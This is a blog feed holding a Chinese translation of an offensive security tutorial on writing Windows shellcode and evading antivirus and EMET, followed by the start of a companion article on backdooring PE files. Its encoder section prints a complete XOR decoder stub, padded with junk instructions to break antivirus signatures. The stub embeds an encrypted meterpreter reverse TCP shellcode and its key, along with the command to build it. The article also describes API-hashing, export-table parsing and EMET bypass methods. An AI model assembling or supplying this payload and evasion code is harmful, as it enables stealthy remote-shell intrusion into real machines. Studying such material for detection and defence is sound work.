<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  
  <title><![CDATA[Lyon's blog]]></title>
  <subtitle><![CDATA[I hear and I forget.I see and I remember.I do and I understand.]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://www.youngroe.com//"/>
  <updated>2021-03-17T14:29:05.074Z</updated>
  <id>http://www.youngroe.com//</id>
  
  <author>
    <name><![CDATA[Lyon]]></name>
    <email><![CDATA[geemion@gmail.com]]></email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[反检测的艺术3-shellcode的魔力 （翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/"/>
    <id>http://www.youngroe.com/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/</id>
    <published>2020-09-10T11:39:22.000Z</published>
    <updated>2021-03-17T14:29:05.074Z</updated>
    <content type="html"><![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br><a id="more"></a></p>
<h2 id="0x00_相关术语">0x00 相关术语</h2><h3 id="进程环境块（PEB）">进程环境块（PEB）</h3><p>在计算机中进程环境块（缩写为PEB）是Windows NT操作系统中的一种数据结构。它是操作系统内部使用的不透明数据结构，其中大多数字段除操作系统外均不供其他人使用。微软在其MSDN库文档（仅记录了一些字段）中指出，该结构可能会在Windows的未来版本中更改。PEB包含涉及整个进程很多阐述，包括全局上下文，启动参数，程序映像加载器的数据结构，程序映像基址以及用于为进程范围的数据结构提供互斥的同步对象。</p>
<h3 id="导入表（IAT）">导入表（IAT）</h3><p>导入表是一种用于查找地址的表，用于程序调用其他模块中的函数时查找地址。它可以采用按序号导入和按名称导入两种形式。由于已编译的程序无法知道其依赖的库的存储位置，因此，每当进行API调用时，都需要进行间接跳转。当动态链接器加载模块并将它们连接在一起时，它会将实际地址写入IAT插槽，以便它们指向相应库函数的所在的内存位置。</p>
<h3 id="数据执行保护（DEP）">数据执行保护（DEP）</h3><p>数据执行保护（DEP）是一组硬件和软件技术，可对内存执行安全检查，以帮助防止恶意代码在系统上运行。在Microsoft Windows XP Service Pack 2（SP2）和Microsoft Windows XP Tablet PC Edition 2005中，DEP由硬件和软件强制执行。DEP的主要好处是可以帮助防止从数据页执行代码。通常，不会从默认堆和栈中执行代码。硬件强制的DEP检测从这些位置运行的代码，并在执行时引发异常。软件强制的DEP可以帮助防止恶意代码利用Windows中的异常处理机制。</p>
<h3 id="地址布局随机化（ASLR）">地址布局随机化（ASLR）</h3><p>地址空间布局随机化（ASLR）是一种有关防止缓冲区溢出攻击的计算机安全技术。为了防止攻击者可靠地跳转到内存中的某个特定漏洞位置利用功能，ASLR随机排列进程的关键数据区域的地址空间位置，包括可执行文件的基地址以及栈、堆和依赖库地址。</p>
<h3 id="stdcall调用约定">stdcall调用约定</h3><p>stdcall调用约定是Pascal调用约定的一种变体，在该约定中，被调用方负责清理栈，但参数按照_cdecl调用约定的顺序从右到左入栈。寄存器EAX，ECX和EDX被指定在函数内使用。返回值存储在EAX寄存器中。 stdcall是Microsoft Win32 API和Open Watcom C ++的标准调用约定。</p>
<h2 id="0x01_相关介绍">0x01 相关介绍</h2><p>Shellcode在网络安全领域中扮演着非常重要的角色，它被广泛用于许多恶意软件和漏洞利用中。那么，什么是shellcode？ Shellcode是一串数据，将被解释为CPU上的指令，编写Shellcode的主要目的是利用漏洞，该漏洞允许在系统上执行任意代码（例如溢出漏洞），因为Shellcode可以直接在内存内运行，大量恶意代码都利用它。名称shellcode的原因是一般shellcode在执行时会返回命令shell。但随着时间的推移，含义已经演变，如今几乎所有编译器生成的程序都可以转换为shellcode，因为编写shellcode涉及深入了解目标体系结构和操作系统的汇编语言后，本文将假定读者知道如何在Windows和Linux环境下以汇编形式编写程序。互联网上有很多开源的shellcode，但是为了利用新的漏洞和不同的漏洞，每个网络安全研究人员都应该能够编写自己的复杂shellcode，并且编写自己的shellcode有助于理解操作的关键概念。本文的目的是解释基本的shellcode概念，展示降低shellcode的检测率并绕过某些漏洞缓解措施的方法。</p>
<h2 id="0x02_shellcode编写基础">0x02 shellcode编写基础</h2><p>为不同的操作系统编写shellcode要使用不同的方法，与Windows不同，基于UNIX的操作系统提供了一种通过int 0x80接口与内核进行通信的直接方法，基于UNIX的操作系统内部的所有syscall都有一个唯一的编号，即调用0x80中断代码（int 0x80），内核使用给定的编号和参数执行syscall，但这是问题所在，Windows没有直接的内核接口，这意味着必须有指向函数的具体指针（内存地址）才能调用它们，不幸的是，对功能地址进行硬编码并不能完全解决问题，Windows内部的每个功能地址在每个Service Pack，版本甚至配置中都会发生变化，使用硬编码地址使Shellcode高度依赖版本，在Windows上编写与版本无关的Shellcode可以解决寻址问题可能会贯穿整个解决地址问题，这可以通过在运行时动态查找函数地址来实现。</p>
<h2 id="0x03_解决地址问题">0x03 解决地址问题</h2><p>在整个过程中，shellcode编写者一直在寻找在运行时查找Windows API函数地址的巧妙方法，在本文中，我们将重点介绍一种称为PEB解析的方法，该方法使用Process Environment Block（PEB）数据结构来查找基地址。在分析已加载的DLL并通过分析导出表（EAT）来找到其函数地址时，metasploit框架内的几乎所有版本无关的Windows shellcode都使用此技术来查找Windows API函数的地址，这种方法利用了在Windows中，可以通过FS段寄存器找到线程环境块（TEB）地址，当执行Shellcode时，TEB块包含很多有用的数据，包括我们正在寻找的PEB结构在内存中，我们需要从TEB块的向后48个字节，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov edx, [fs:eax+<span class="number">48</span>]</span><br></pre></td></tr></table></figure></p>
<p>现在我们有一个指向PEB结构的指针，</p>
<div align="center"><br><img src="/img/anti_av3_TEB.png" align><br></div>

<p>获取PEB结构指针之后，现在我们将从PEB块的开头开始向后移动12个字节，以获取PEB块内部的Ldr数据结构指针的地址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">12</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_PEB.png" align><br></div>

<p>Ldr结构包含有关该进程已加载模块的信息，如果我们在Ldr结构内再移20个字节，我们将到达InMemoryOrderModuleList中的第一个模块，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">20</span>]</span><br></pre></td></tr></table></figure></p>
<div align="center"><br><img src="/img/anti_av3_Ldr.png" align><br></div>

<p>现在，我们的指针指向InMemoryOrderModuleList，这是一个LIST_ENTRY结构，Windows将该结构定义为包含该进程已加载模块的双向链接列表的头部。列表中的每个项目都是一个指向LDR_DATA_TABLE_ENTRY结构的指针，该结构是我们的主要目标，它包含已加载DLL（模块）的全名和基址，由于已加载模块的顺序可以更改，因此我们应检查全名为了找到包含我们要查找函数的正确的DLL，可以轻松地做到这一点，只要DLL名称与我们要查找的名称相匹配，则从LDR_DATA_TABLE_ENTRY的开头向后移40个字节，我们可以继续进行，通过在LDR_DATA_TABLE_ENTRY内部向前移动16个字节，我们现在终于有了加载的DLL的基址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx+<span class="number">16</span>]</span><br></pre></td></tr></table></figure>
<div align="center"><br><img src="/img/anti_av3_LDR_DATA_TABLE_ENTRY.png" align><br></div><br>获取函数地址的第一步已经完成，现在我们有了包含所需函数的DLL的基址，我们必须解析DLL的导出表才能找到所需的函数地址，导出表位于在PE可选头中，从基地址向后移动60个字节，我们现在有了一个指向DLL在内存中的PE可选头的指针，<br><div align="center"><br><img src="/img/anti_av3_PE_On_Memory.gif" align><br></div>

<p>最后我们需要使用（模块基地址+ PE头地址+ 120字节）公式计算导出表的地址，这将给出导出表的地址（EAT），获得EAT地址后，我们现在可以访问对于DLL导出的所有功能，Microsoft下图描述了IMAGE_EXPORT_DIRECTORY，</p>
<div align="center"><br><img src="/img/anti_av3_Image_Export_Directory.gif" align><br></div><br>该结构包含导出函数的地址，名称和数量，使用同大小计算方式可以遍历函数地址，可以在此结构内获得所需的函数地址，当然，由于每个Windows版本，导出函数的顺序可能会有所不同在获取函数地址之前，应先检查函数名称，在确定函数名称之后，现在就可以找到函数地址，因此您可以理解，此方法仅涉及计算多个Windows数据结构的大小，并且遍历内存内部，这里真正的挑战是建立一个可靠的名称比较机制来选择正确的DLL和功能，似乎PEB解析技术很难实现，请不要担心，有更简单的方法可以做到这一点。<br><br>## 0x04 API哈希<br><br><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">metasploit</a>项目中的几乎所有shellcode都使用一个称为<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">Hash API</a>的汇编块，这是Stephen Fewer编写的一小段代码，自2009年以来，在metasploit中大多数Windows版本shellcode都使用了这个汇编文块，该汇编块使解析PEB结构变得更加容易，它使用基本的PEB解析逻辑和一些其他哈希方法来通过计算函数和模块名称的ROR13哈希来快速查找所需的函数。此块的用法非常简单，它使用stdcall调用约定，唯一的区别在于传送的函数参数，它需要函数名和包含该函数的DLL名称的ROR13哈希，传送必需的参数和函数哈希之后，它如前所述解析了PEB块，并在找到模块名后找到了模块名它计算ROR13哈希并将其保存到栈中，然后移至DLL的导出地址表，并计算每个函数名的ROR13哈希，它获取每个函数名称哈希值和模块名称哈希值的总和，如果总和与我们正在寻找的哈希值匹配，则意味着找到了所需的函数，最后，Hash API使用以下命令跳转到找到的函数地址在堆栈上传递的参数，这是一段非常优雅的代码，但由于它的流行和广泛使用，它已经到了最后的日子，某些反病毒产品和漏洞缓解措施专门针对此代码块的工作逻辑，甚至某些视反病毒产品对使用Hash API所使用的ROR13哈希作为识别恶意文件的签名，由于操作系统内部反漏洞解决方案的最新进展，Hash API的寿命很短，但是还有其他找到Windows的方法API函数地址，同时使用编码方法，此方法仍可以绕过大多数反病毒产品。<br><br>## 0x05 编码器/解码器设计<br><br>在开始涉及之前，读者需要知道的是单独使用编码器并不能生成完全不可检测的shellcode，在执行shellcode后解码器将直接解码整个shellcode为其原始形式，这不能绕过反病毒产品的动态分析机制。<br>解码器逻辑很简单，它将使用一个随机生成的多字节XOR密钥对shellcode进行解码，在执行解码操作后它将执行它，在将shellcode放入解码器头之前，应使用多字节XOR密钥对shellcode进行加密，并且应将shellcode和XOR密钥分别放置在<shellcode>、<key>标签内，<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#===============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode    |&#10;;&#9;|EDI -&#62; Pointer to key          |&#10;;&#9;|ECX -&#62; Shellcode index counter |&#10;;&#9;|EDX -&#62; Key index counter       |&#10;;&#9;|AL  -&#62; Shellcode byte holder   |&#10;;&#9;|BL  -&#62; Key byte holder         |&#10;;&#9;#===============================#&#10;;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10; JMP GetShellcode         ; Jump to shellcode label&#10;Stub: &#10; POP ESI                  ; Pop out the address of shellcode to ESI register &#10; PUSH ESI                 ; Save the shellcode address to stack &#10; XOR ECX,ECX              ; Zero out the ECX register&#10;GetKey: &#10; CALL SetKey              ; Call the SetKey label&#10; Key: DB &#60;Key&#62;            ; Decipher key&#10; KeyEnd: EQU $-Key        ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10; POP EDI                  ; Pop the address of decipher key to EDI register&#10; XOR EDX,EDX              ; Zero out the EDX register&#10;Decipher: &#10; MOV AL,[ESI]             ; Move 1 byte from shellcode to AL register&#10; MOV BL,[EDI]             ; Move 1 byte from decipher key to BL register&#10; XOR AL,BL                ; Make a logical XOR operation between AL ^ BL&#10; MOV [ESI],AL             ; Move back the deciphered shellcode byte to same index&#10; INC ESI                  ; Increase the shellcode index&#10; INC EDI                  ; Increase the key index&#10; INC ECX                  ; Increase the shellcode index counter&#10; INC EDX                  ; Increase the key index counter&#10; CMP ECX, End             ; Compare the shellcode index counter with shellcode size &#10; JE Fin                   ; If index counter is equal to shellcode size, jump to Fin label&#10; CMP EDX,KeyEnd           ; Compare the key index counter with key size &#10; JE GetKey                ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10; JMP Decipher             ; Repeate all operations&#10;Fin:                      ; In here deciphering operation is finished&#10; RET                      ; Execute the shellcode&#10;GetShellcode:&#10; CALL Stub                ; Jump to Stub label and push the address of shellcode to stack&#10; Shellcode: DB &#60;Shellcode&#62;&#10;&#10; End: EQU $-Shellcode     ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>由于代码几乎是自解释的，因此我不会浪费时间逐行解释它，使用JMP / CALL技巧可以在运行时获取shellcode和密钥的地址，然后使用shellcode的每个字节与密钥的每个字节做xor运算，每次解密密钥到达结尾时，它将重头开始使用密钥，完成解码操作后，它将跳转到shellcode，使用更长的XOR密钥会增加shellcode的随机性，还会增加代码块的熵，因此避免使用太长的解密密钥，有数百种方法使用基本逻辑运算（例如XOR，NOT，ADD，SUB，ROR，ROL）对shellcode进行编码，在每个编码器例程中都有无限可能的shellcode输出，可能反病毒产品在解码shellcode之前检测外壳代码的签名非常低，因为某些反病毒产品还开发了启发式引擎，能够检测代码块内的解密和解码循环。在编写shellcode编码器时，这里还有几种方法可以绕过针对shellcode编码器的静态检测，<br><br>### 不常见的寄存器用法<br><br>在x86体系结构中，所有寄存器都有特定的用途，例如ECX代表扩展计数器寄存器，它通常用作循环计数器，当我们以任何编译语言编写基本循环条件时，编译器可能会使用ECX寄存器作为循环计数器。循环计数器变量，启发式引擎在代码块中找到连续增加的ECX寄存器强烈表明存在循环，此问题的解决方案很简单，不将ECX寄存器用于循环计数器，这只是一个示例，但它也非常对于所有其他类型的代码片段（如函数结尾/序言等）有效。很多代码识别机制取决于寄存器使用情况，用非常用的寄存器使用方式编写汇编代码会降低检测率。<br><br>### 垃圾代码填充<br><br>可能有数百种方法来识别代码块内的解码器，并且几乎每个反病毒产品都使用不同的方法，但是最终它们必须生成一个签名。在解码器代码内随机使用NOP指令是一个很好的方法绕过基于签名的静态检测，也可以使用其他任何不影响程序原始功能的指令指令替代NOP指令，其目的是添加垃圾指令以分解代码块内的恶意签名，另一个编写shellcode的重要之处在于大小，因此请避免在解码器内部使用过多的垃圾混淆代码，否则会增加整体大小。<br>实施此方法后，结果代码如下所示：<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#9;#==============================#&#10;;&#9;|ESI -&#62; Pointer to shellcode   |&#10;;&#9;|EDI -&#62; Pointer to key         |&#10;;&#9;|EAX -&#62; Shellcode index counter|&#10;;&#9;|EDX -&#62; Key index counter      |&#10;;&#9;|CL  -&#62; Shellcode byte holder  |&#10;;&#9;|BL  -&#62; Key byte holder        |&#10;;&#9;#==============================#&#10;;&#10;&#10;[BITS 32]&#10;[ORG 0]&#10;&#10;    JMP GetShellcode                ; Jump to shellcode label&#10;Stub:       &#10;    POP ESI                         ; Pop out the address of shellcode to ESI register        &#10;    PUSH ESI                        ; Save the shellcode address to stack &#10;    XOR EAX,EAX                     ; Zero out the EAX register&#10;GetKey:     &#10;    CALL SetKey                     ; Call the SetKey label&#10;    Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6                 ; Decipher key&#10;    KeyEnd: EQU $-Key               ; Set the size of the decipher key to KeyEnd label&#10;SetKey:&#10;    POP EDI                         ; Pop the address of decipher key to EDI register&#10;    NOP                             ; [GARBAGE]&#10;    XOR EDX,EDX                     ; Zero out the EDX register&#10;    NOP                             ; [GARBAGE]&#10;Decipher:       &#10;    NOP                             ; [GARBAGE]&#10;    MOV CL,[ESI]                    ; Move 1 byte from shellcode to CL register&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV BL,[EDI]                    ; Move 1 byte from decipher key to BL register&#10;    NOP                             ; [GARBAGE]&#10;    XOR CL,BL                       ; Make a logical XOR operation between CL ^ BL&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    MOV [ESI],CL                    ; Move back the deciphered shellcode byte to same index&#10;    NOP                             ; [GARBAGE]&#10;    NOP                             ; [GARBAGE]&#10;    INC ESI                         ; Increase the shellcode index&#10;    INC EDI                         ; Increase the key index&#10;    INC EAX                         ; Increase the shellcode index counter&#10;    INC EDX                         ; Increase the key index counter&#10;    CMP EAX, End                    ; Compare the shellcode index counter with shellcode size &#10;    JE Fin                          ; If index counter is equal to shellcode size, jump to Fin label&#10;    CMP EDX,KeyEnd                  ; Compare the key index counter with key size &#10;    JE GetKey                       ; If key index counter is equal to key size, jump to GetKey label for reseting the key&#10;    JMP Decipher                    ; Repeate all operations&#10;Fin: ; In here deciphering operation is finished&#10;    RET                             ; Execute the shellcode&#10;GetShellcode:&#10;    CALL Stub                       ; Jump to Stub label and push the address of shellcode to stack&#10;    Shellcode: DB  0x84, 0x73, 0x47, 0xb9, 0x7f, 0x77, 0x59, 0xd5, 0xaa, 0x97, 0xb8, 0xff,&#10;  0x4e, 0xe9, 0x4f, 0xfc, 0x6b, 0x50, 0xc4, 0xf4, 0x6c, 0x10, 0xb7, 0x91,&#10;  0x70, 0xc0, 0x73, 0x7a, 0x7e, 0x59, 0xd4, 0xa7, 0xa4, 0xc5, 0x7d, 0x5b,&#10;  0x19, 0x9d, 0x80, 0xab, 0x79, 0x5c, 0x27, 0x4b, 0x2d, 0x20, 0xb2, 0x0e,&#10;  0x5f, 0x2d, 0x32, 0xa7, 0x4e, 0xf5, 0x6e, 0x0f, 0xda, 0x14, 0x4e, 0x77,&#10;  0x29, 0x10, 0x9c, 0x99, 0x7e, 0xa4, 0xb2, 0x15, 0x57, 0x45, 0x42, 0xd2,&#10;  0x4e, 0x8d, 0xf4, 0x76, 0xef, 0x6d, 0xb0, 0x0a, 0xb9, 0x54, 0xc8, 0xb8,&#10;  0xb8, 0x4f, 0xd9, 0x29, 0xb9, 0xa5, 0x05, 0x63, 0xfe, 0xc4, 0x5b, 0x02,&#10;  0xdd, 0x04, 0xc4, 0xfe, 0x5c, 0x9a, 0x16, 0xdf, 0xf4, 0x7b, 0x72, 0xd7,&#10;  0x17, 0xba, 0x79, 0x48, 0x4e, 0xbd, 0xf4, 0x76, 0xe9, 0xd5, 0x0b, 0x82,&#10;  0x5c, 0xc0, 0x9e, 0xd8, 0x26, 0x2d, 0x68, 0xa3, 0xaf, 0xf9, 0x27, 0xc1,&#10;  0x4e, 0xab, 0x94, 0xfa, 0x64, 0x34, 0x7c, 0x94, 0x78, 0x9b, 0xad, 0xce,&#10;  0x0c, 0x45, 0x66, 0x08, 0x27, 0xea, 0x0f, 0xbd, 0xc2, 0x46, 0xaa, 0xcf,&#10;  0xa9, 0x5d, 0x4f, 0xa6, 0x51, 0x5f, 0x91, 0xe9, 0x17, 0x5e, 0xb9, 0x37,&#10;  0x4f, 0x59, 0xad, 0xf1, 0xc0, 0xd1, 0xbf, 0xdf, 0x3b, 0x47, 0x27, 0xa4,&#10;  0x78, 0x8a, 0x99, 0x30, 0x99, 0x27, 0x69, 0x0c, 0x1f, 0xe6, 0x28, 0xdb,&#10;  0x95, 0xd1, 0x95, 0x78, 0xe6, 0xbc, 0xb0, 0x73, 0xef, 0xf1, 0xd5, 0xef,&#10;  0x28, 0x1f, 0xa0, 0xf9, 0x3b, 0xc7, 0x87, 0x4e, 0x40, 0x79, 0x0b, 0x7b,&#10;  0xc6, 0x12, 0x47, 0xd3, 0x94, 0xf3, 0x35, 0x0c, 0xdd, 0x21, 0xc6, 0x89,&#10;  0x25, 0xa6, 0x12, 0x9f, 0x93, 0xee, 0x17, 0x75, 0xe0, 0x94, 0x10, 0x59,&#10;  0xad, 0x10, 0xf3, 0xd3, 0x3f, 0x1f, 0x39, 0x4c, 0x4f, 0xa6, 0x2e, 0xf1,&#10;  0xc5, 0xd1, 0x27, 0xd3, 0x6a, 0xb9, 0xb0, 0x73, 0xeb, 0xc8, 0xaf, 0xb9,&#10;  0x29, 0x24, 0x6e, 0x34, 0x4d, 0x7f, 0xb0, 0xc4, 0x3a, 0x6c, 0x7e, 0xb4,&#10;  0x10, 0x9a, 0x3a, 0x48, 0xbb&#10;&#10;&#10;    End: EQU $-Shellcode            ; Set the shellcode size to End label</span><br></pre></td></tr></table></figure><br><br>唯一的变化是EAX和ECX寄存器之间的变化，现在负责计算shellcode索引的寄存器是EAX，并且每条XOR和MOV指令之间只有几行NOP填充，本教程使用的shellcode是Windowsmeterpreter反向TCP，经过加密带有10字节长的随机XOR密钥的shellcode都放置在解码器中，使用nasm -f bin Decoder.asm命令将解码器组装为二进制格式（不要忘记删除shellcode上的换行符否则nasm会编译失败）。<br>这是对原始Shellcode进行编码之前的反病毒扫描结果，<br><br><div align="center"><br><img src="/img/anti_av3_Shellcode.png" align><br></div>

<p>如您所见，许多反病毒软件都可以识别Shellcode。这是经过编码的shellcode的结果，</p>
<div align="center"><br><img src="/img/anti_av3_EncodedShellcode.png" align><br></div>

<h2 id="0x06_对抗漏洞缓解方案">0x06 对抗漏洞缓解方案</h2><p>当绕过反病毒软件时，有很多成功的方法，但是漏洞​​利用缓解将情况提升到一个全新的水平，微软在2009年发布了<a href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit" target="_blank" rel="external">增强缓解体验工具包（EMET）</a>，它是一种有助于防止漏洞利用的实用程序。在成功开发软件方面，它具有多种保护机制，</p>
<ul>
<li>动态数据执行保护（DEP）</li>
<li>结构异常处理程序覆盖保护（SEHOP）</li>
<li>空页分配</li>
<li>堆喷防护</li>
<li>导出地址表地址过滤（EAF）</li>
<li>强制性ASLR</li>
<li>导出地址表访问过滤增强版（EAF +）</li>
<li>缓解ROP<ul>
<li>加载库检查</li>
<li>内存保护检查</li>
<li>调用方检查</li>
<li>模拟执行流程</li>
<li>Stack pivot</li>
</ul>
</li>
<li>减少攻击面（ASR）</li>
</ul>
<p>在这些缓解措施中，EAF，EAF +和调用方检查是我们最关注的问题，如前所述，metasploit框架中的几乎所有shellcode都使用Stephen Fewer的Hash API，并且由于Hash API应用了PEB/EAT解析技术，因此EMET可以轻松检测并阻止执行shellcode。</p>
<h2 id="0x07_绕过EMET">0x07 绕过EMET</h2><p>调用方检查EMET内部以检查由进程进行的Windows API调用，它阻止Win API函数中的RET和JMP指令，以防止在找到所需的Win API之后在Hash API中使用所有使用面向返回的编程（ROP）方法的漏洞利用函数地址使用JMP指令执行函数，不幸的是这将触发EMET调用者检查，为了绕过调用者检查，应避免使用指向Win API函数的JMP和RET指令，而应替换用于执行的JMP指令带有CALL的Win API函数，Hash API应该通过调用方检查，但是当我们查看EAF、EAF+缓解技术时，它们会阻止访问导出地址表（EAT）进行读/写访问，具体取决于所调用的代码，并检查栈寄存器是否在允许的范围内，并尝试检测对某些DLL如KERNELBASE的MZ/PE头的访问，这是一种用于防止EAT解析技术的非常有效的缓解方法，但是EAT并不是唯一包含所需函数地址的结构，如果应用程序使用了，则导入地址表（IAT）还将保存应用程序使用的Win API函数地址还在使用所需的功能时，可以在IAT结构中收集功能地址，一位名叫Joshua Pitts的网络安全研究人员最近开发了一种新的IAT解析方法，它在导入地址表中找到了LoadLibraryA和GetProcAddress Windows API函数，在获取这些函数地址后，可以从任何库中提取任何函数，他还编写了一个名为fido的工具，用于剥离Stephen Fewer的Hash API并替换为他编写的IAT解析代码，如果您想在阅读有关此方法的更多信息请点击<a href="https://github.com/secretsquirrel/fido/blob/master/REconBR_2017.pdf" target="_blank" rel="external">这</a>.</p>
<h2 id="参考">参考</h2><ul>
<li><a href="https://msdn.microsoft.com/en-us/library/ms809762.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms809762.aspx</a></li>
<li><a href="https://en.wikipedia.org/wiki/Process_Environment_Block" target="_blank" rel="external">https://en.wikipedia.org/wiki/Process_Environment_Block</a></li>
<li><a href="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003" target="_blank" rel="external">https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003</a></li>
<li><a href="https://en.wikipedia.org/wiki/Portable_Executable" target="_blank" rel="external">https://en.wikipedia.org/wiki/Portable_Executable</a></li>
<li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="external">https://en.wikipedia.org/wiki/X86_calling_conventions</a></li>
<li><a href="http://www.vividmachines.com/shellcode/shellcode.html" target="_blank" rel="external">http://www.vividmachines.com/shellcode/shellcode.html</a></li>
<li><a href="https://github.com/secretsquirrel/fido" target="_blank" rel="external">https://github.com/secretsquirrel/fido</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></li>
<li><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="external">The Shellcoder’s Handbook: Discovering and Exploiting Security Holes</a></li>
<li><a href="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059" target="_blank" rel="external">Sockets, Shellcode, Porting, and Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals</a></li>
</ul>
<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/</a></em></p>
</key></shellcode>]]></content>
    <summary type="html">
    <![CDATA[<p> 本文将讨论编写shellcode的基础知识和相关改变，包含汇编级别的编码器/解码器设计以及几种绕过漏洞缓解方案的方法，如微软的增强缓解应急工具包（Microsoft’s Enhanced Mitigation Experience Toolkit，EMET）。为了理解本文的内容，读者需要至少具有一定的x86汇编方面的基础，并对COFF和PE等基本文件格式有相当的了解，也可以读之前的文章<a href="http://www.youngroe.com/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述</a>、<a href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门</a>理解反病毒软件使用的基本检测技术的内部工作原理和相关术语。<br>]]>
    
    </summary>
    
      <category term="反病毒" scheme="http://www.youngroe.com/tags/%E5%8F%8D%E7%97%85%E6%AF%92/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[反检测的艺术2-如何制作PE文件后门（翻译）]]></title>
    <link href="http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/"/>
    <id>http://www.youngroe.com/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/</id>
    <published>2020-09-04T11:39:22.000Z</published>
    <updated>2021-03-16T15:19:39.846Z</updated>
    <content type="html"><![CDATA[<p>本文将会介绍用于安全测试红队目的几种制作PE（Portable Executable）文件后门的方法，如果需要完全理解本文，读者至少需要对x86汇编有一定的了解，同时需要熟悉调试器并且对PE文件格式有较高的理解。<br><a id="more"></a></p>
<h2 id="0x00_介绍">0x00 介绍</h2><p>现在，几乎所有安全研究人员，测试人员和恶意软件分析师在日常工作中都会处理后门，维持后门访问权限最流行的方式是将后门安装到系统或某个软件中。本文的大部分内容是如何在32位PE文件中植入后门的方法，但是由于PE文件格式是Unix COFF（通用对象文件格式）的修改版本，因此这些方法也可以移植用于所有其他可执行二进制文件文件类型。植入后门的隐蔽性对在系统中停留更长的时间非常重要，因此本文介绍的方法都会尽量减少被反病毒软件检出的概率。在继续阅读本文之前，请先阅读第一篇文章<a href="http://www.youngroe.com/art-of-anti-detection-1-introduction-to-av-detection-techniques">反检测的艺术1-反病毒软件及检测技术概述</a>，这对于理解反病毒产品的内部工作原理和有关反检测的基本思路将非常有帮助。</p>
<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="红队渗透测试">红队渗透测试</h3><p>在网络安全领域，红队是一群白帽黑客，他们像攻击者一样攻击组织的网络基础架构，目的是测试（通常称为渗透测试）组织的防御能力。包括Microsoft在内的公司会定期组织红蓝两队进行渗透测试。组织红蓝两队的渗透测试体现了以攻促防的安全理念，可以快速发现网络安全问题并及早解决。</p>
